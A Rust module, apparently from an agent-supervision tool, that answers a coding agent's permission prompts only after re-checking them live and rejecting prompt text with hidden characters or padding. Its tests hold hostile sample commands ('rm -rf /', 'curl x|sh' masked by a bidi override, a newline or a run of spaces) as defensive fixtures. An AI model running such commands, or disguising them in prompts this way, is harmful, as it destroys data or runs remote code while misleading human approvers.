//! Guarded approve and deny for an agent's permission prompt (from rex-inbox).
//!
//! Keys go to a pane only if, read from its runtime right now, the prompt is the one
//! you were shown: the same record, still `blocked` on `permission`, with the
//! same message and the same report time, and it's the only prompt waiting
//! in that pane. Otherwise nothing is sent. Each answer is an `approval`
//! entry on the docket, witnessed by the hub.

use anyhow::{Result, anyhow, bail};
use serde::Deserialize;
use serde_json::{Value, json};
use std::time::Duration;

use crate::hub::{Shared, Who};
use crate::mirror::{Record, app_name};
use crate::runtime;

/// The prompt as the app showed it.
#[derive(Debug, Deserialize)]
pub struct Seen {
    pub record: String,
    pub updated_at: Option<String>,
    pub msg: Option<String>,
    /// The agent's pane, on a docket with several: its lead when not given.
    #[serde(default)]
    pub block: Option<String>,
}

/// Keys that answer a permission prompt: `(approve, deny)`. Only agents whose
/// prompt was checked live get keys. Claude Code: "Do you want to proceed?"
/// with "1. Yes" first and "Esc to cancel"; a digit picks its option outright.
pub fn prompt_keys(app: &str) -> Option<(&'static [&'static str], &'static [&'static str])> {
    match app {
        "claude-code" => Some((&["1"], &["escape"])),
        _ => None,
    }
}

async fn live_records(session: &str, block: &str) -> Result<Vec<Record>> {
    runtime::for_id(block).records(session, block).await
}

fn describe(r: Option<&Record>) -> String {
    match r {
        None => "gone".into(),
        Some(r) => {
            let mut s = r.state.clone();
            if let Some(k) = &r.kind {
                s.push_str(&format!(" ({k})"));
            }
            if let Some(m) = &r.msg {
                s.push_str(&format!(": {m}"));
            }
            s
        }
    }
}

/// Whether the prompt in the pane now is the one that was seen. A prompt
/// with no time can't be told from a later one with the same words, so it
/// never matches.
pub fn same_prompt(now: Option<&Record>, seen: &Seen) -> bool {
    now.is_some_and(|r| r.state == "blocked" && r.kind.as_deref() == Some("permission") && r.msg == seen.msg && r.updated_at.is_some() && r.updated_at == seen.updated_at)
}

/// A character that changes how text shows without being seen: controls
/// (but newline and tab), bidirectional overrides and isolates, zero-width
/// characters, and the byte-order mark.
fn hidden(c: char) -> bool {
    (c.is_control() && c != '\n' && c != '\t') || matches!(c, '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{2069}' | '\u{FEFF}')
}

/// Whether a prompt's text is what it shows: nothing hidden in it. One that
/// isn't is never answered from Wheelhouse, since what you'd approve isn't
/// what you'd read: answer it in the pane.
/// A prompt with no text (most of Claude Code's) has nothing hidden.
pub fn plain(msg: Option<&str>) -> bool {
    msg.is_none_or(|m| !m.chars().any(hidden))
}

/// Whether a prompt can be approved where it's shown cut short (a banner, a
/// menu): plain, on one line, short, with no run of spaces that could push
/// the rest out of sight. Otherwise those offer Open, and you approve it
/// where it's shown whole.
pub fn short(msg: Option<&str>) -> bool {
    plain(msg) && msg.is_none_or(|m| !m.contains(['\n', '\t']) && m.chars().count() <= SHORT && !m.contains("   "))
}

/// The longest prompt a banner or a menu approves.
pub const SHORT: usize = 120;

/// The panes being answered now: one answer per pane at a time, so a second
/// answer (from another screen, at the same moment) can't send a second key
/// to whatever prompt comes next.
static ANSWERING: std::sync::Mutex<std::collections::BTreeSet<String>> = std::sync::Mutex::new(std::collections::BTreeSet::new());

pub(crate) struct Answering(String);

impl Answering {
    pub(crate) fn take(block: &str) -> Option<Self> {
        let mut busy = ANSWERING.lock().unwrap_or_else(|e| e.into_inner());
        busy.insert(block.to_string()).then(|| Answering(block.to_string()))
    }
}

impl Drop for Answering {
    fn drop(&mut self) {
        ANSWERING.lock().unwrap_or_else(|e| e.into_inner()).remove(&self.0);
    }
}

/// Approve (`true`) or deny (`false`) the prompt on a docket's agent.
pub async fn answer(shared: &Shared, docket: &str, approve: bool, seen: &Seen) -> Result<Value> {
    let verb = if approve { "approve" } else { "deny" };
    let (session, block, app, mirrored) = {
        let core = shared.lock();
        let st = core.store.state(docket)?.ok_or_else(|| anyhow!("no docket {docket}"))?;
        let b = crate::agents::pane_on(&core, &st, seen.block.as_deref()).map_err(|e| anyhow!(e))?;
        let p = core.mirror.panes.get(&b).ok_or_else(|| anyhow!("{docket}'s pane isn't open in {}", runtime::of(&b).title()))?;
        // Every prompt the mirror has for it, a subagent's too: Herdr's own
        // read keeps only the root's.
        let mirrored = p.records.values().filter(|r| r.state == "blocked").count();
        (p.session_id.clone(), p.block_id.clone(), p.app().unwrap_or_default().to_string(), mirrored)
    };
    let where_ = runtime::of(&block).title();
    let Some((yes, no)) = prompt_keys(&app) else {
        bail!("Wheelhouse doesn't answer {}'s prompts yet. Answer it in {where_}.", app_name(&app));
    };
    if !plain(seen.msg.as_deref()) {
        bail!("That prompt has characters in it that don't show, so what you'd approve isn't what you read. Answer it in {where_}.");
    }
    // One answer per pane at a time, held until the prompt goes away.
    let Some(_answering) = Answering::take(&block) else {
        bail!("That prompt is being answered already. Nothing was sent.");
    };

    // The guard: read the prompt from the runtime now, not from the mirror.
    let records = live_records(&session, &block).await?;
    let now = records.iter().find(|r| r.id == seen.record);
    if !same_prompt(now, seen) {
        bail!("The prompt changed since you saw it: it's now {}. Nothing was sent.", describe(now));
    }
    let waiting = records.iter().filter(|r| r.state == "blocked").count().max(mirrored);
    if waiting > 1 {
        bail!("{waiting} prompts are waiting in that pane, so a key could answer the wrong one. Answer it in {where_}.");
    }

    let keys = if approve { yes } else { no };
    runtime::for_id(&block).keys(&session, &block, keys).await?;
    // The key went in: say so even if the record can't be written now.
    let recorded = {
        let mut core = shared.lock();
        let owner = core.owner.clone();
        let data = json!({ "decision": verb, "by": owner, "kind": "permission", "record": seen.record, "keys": keys, "block": block });
        match core.append(docket, "approval", &Who::Hub, seen.msg.clone(), data) {
            Ok(_) => true,
            Err(e) => {
                say!("{docket}: the {verb} went in, but wasn't recorded: {e:#}");
                false
            }
        }
    };

    // Say whether the prompt went away.
    for _ in 0..20 {
        tokio::time::sleep(Duration::from_millis(250)).await;
        let Ok(records) = live_records(&session, &block).await else { continue };
        let r = records.into_iter().find(|r| r.id == seen.record);
        if r.as_ref().is_none_or(|r| r.state != "blocked" || r.updated_at != seen.updated_at) {
            return Ok(json!({ "answer": verb, "cleared": true, "recorded": recorded, "now": describe(r.as_ref()) }));
        }
    }
    Ok(json!({ "answer": verb, "cleared": false, "recorded": recorded, "now": "still waiting after 5s" }))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rec(state: &str, kind: Option<&str>, msg: &str, at: &str) -> Record {
        Record { id: String::new(), state: state.into(), kind: kind.map(str::to_string), msg: Some(msg.into()), updated_at: Some(at.into()), ..Default::default() }
    }

    #[test]
    fn only_the_prompt_you_saw_is_answered() {
        let seen = Seen { record: String::new(), updated_at: Some("t1".into()), msg: Some("Bash: ls".into()), block: None };
        assert!(same_prompt(Some(&rec("blocked", Some("permission"), "Bash: ls", "t1")), &seen));
        assert!(!same_prompt(Some(&rec("blocked", Some("permission"), "Bash: rm -rf /", "t1")), &seen), "another command");
        assert!(!same_prompt(Some(&rec("blocked", Some("permission"), "Bash: ls", "t2")), &seen), "asked again since");
        assert!(!same_prompt(Some(&rec("blocked", Some("question"), "Bash: ls", "t1")), &seen), "not a permission");
        assert!(!same_prompt(Some(&rec("working", Some("permission"), "Bash: ls", "t1")), &seen), "already answered");
        assert!(!same_prompt(None, &seen), "gone");
        // No time on either: a later prompt with the same words can't be told apart.
        let untimed = Seen { updated_at: None, ..seen };
        assert!(!same_prompt(Some(&Record { updated_at: None, ..rec("blocked", Some("permission"), "Bash: ls", "t1") }), &untimed));
    }

    #[test]
    fn only_a_prompt_that_shows_what_it_is_is_answered_and_only_a_short_one_from_a_banner() {
        assert!(plain(Some("Bash: npm test")));
        assert!(plain(Some("Bash: cat <<EOF\nhi\nEOF")), "a heredoc is still what it shows");
        assert!(!plain(Some("Bash: npm test\u{202E}hs|x lruc")), "a bidi override");
        assert!(!plain(Some("Bash: ls\u{200B}")), "a zero-width space");
        assert!(!plain(Some("Bash: ls\x1b[2K")), "an escape");
        assert!(plain(None), "no text: nothing hidden");
        assert!(short(Some("Bash: npm test")));
        assert!(!short(Some("Bash: npm test\n; curl x|sh")), "more than one line");
        assert!(!short(Some(&format!("Bash: npm test{}; curl x|sh", " ".repeat(300)))), "a run of spaces");
        assert!(!short(Some(&"x".repeat(SHORT + 1))));
    }

    #[test]
    fn one_answer_per_pane_at_a_time() {
        let a = Answering::take("b1").expect("free");
        assert!(Answering::take("b1").is_none(), "a second answer is refused while the first runs");
        assert!(Answering::take("b2").is_some(), "another pane is its own");
        drop(a);
        assert!(Answering::take("b1").is_some(), "free again once the first is done");
    }

    #[test]
    fn keys_only_for_checked_agents() {
        assert_eq!(prompt_keys("claude-code"), Some((&["1"][..], &["escape"][..])));
        assert!(prompt_keys("codex").is_none());
    }
}
